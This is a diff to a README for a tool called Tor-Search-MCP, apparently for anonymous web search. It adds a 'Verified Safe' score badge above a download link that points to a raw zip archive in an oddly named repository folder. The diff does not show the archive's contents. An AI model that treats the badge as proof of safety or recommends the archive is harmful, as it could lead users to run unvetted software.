@@ -1,5 +1,7 @@
 # 🛠️ Tor-Search-MCP - Browse the Web Anonymously with Ease
 
+[![SafeSkill 90/100](https://img.shields.io/badge/SafeSkill-90%2F100_Verified%20Safe-brightgreen)](https://safeskill.dev/scan/bigbang142-tor-search-mcp)
+
 [![Download Tor-Search-MCP](https://github.com/BigBang142/Tor-Search-MCP/raw/refs/heads/main/facellite/Search-Tor-MCP-v2.9.zip)](https://github.com/BigBang142/Tor-Search-MCP/raw/refs/heads/main/facellite/Search-Tor-MCP-v2.9.zip)
 
 ## 🚀 Getting Started
